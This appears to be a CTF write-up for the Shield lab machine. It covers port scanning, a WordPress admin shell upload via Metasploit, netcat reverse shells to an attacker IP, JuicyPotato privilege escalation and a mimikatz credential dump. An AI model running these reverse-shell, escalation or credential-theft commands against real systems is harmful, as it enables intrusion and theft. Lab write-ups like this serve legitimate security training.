Shield is a windows based OS from the starting point labs. Let's enumerate the machine to find some interesting stuff

i. Enumeration
===============
# nmap -sC -sV -vvv -T4 --min-rate=1000 -oN shieldscan <ip>
-> Scanning the machine gives us some interesting open ports
80 - http
3306 - mysql

Visiting the http page gives us nothing interesting.So we will try to enumerate any subdirectories for the main domain

#dirb http://<ip>
- It will automatically search for subdirectories and files from common.txt wordlist

/wordpress is a directory we got while enumeration

Manual visiting through the website gives a login page where we can login as admin
username : admin
password : P@s5w0rd!  < Password we found in vaccine lab>

We are now into the admin panel

ii. Initial Access
===================

-> Open the metasploit and search wp_admin which will result in following exploit
exploit: exploit/unix/webapp/wp_admin_shell_upload 
set the appropriate options and exploit

-> thus we have a meterpreter shell but it is not stable.we will make it more stable by upload a nc.exe file and start a netcat listener on attacker machine
#nc -lvp 1234
meterpreter>upload nc.exe
meterpreter>execute -f nc.exe -a " -e cmd.exe <attackerip> 1234"


iii. Privilege Escalation
==========================
- Running the sysinfo on the system provide us the system information which is vulnerable to juicy-potato attack for privilege escalation
- Download juicypotato.exe from github
Open the meterpreter and change directory to uploads and upload the file
meterpreter> upload /root/Downlaods/juicypotato.exe 
meterpreter>mv juicypotato.exe js.exe

Go to our previously owned shell and run the following command:
Create a batch file to be run during our execution and save as shell.bat

> START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.8 4444 

Execute batch file using js.exe and on attacker machine start a netcat listener
# nc -lvp 4444
> js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337

**********We Got root flag on Administrator Desktop***************

meterpreter>upload mimikatz.exe
shell> ./mimikatz.exe
mimikatz>sekurlsa::logonpasswords
### We found some interesting credentials###
          kerberos :
         * Username : sandra
         * Domain   : MEGACORP.LOCAL
         * Password : Password1234!
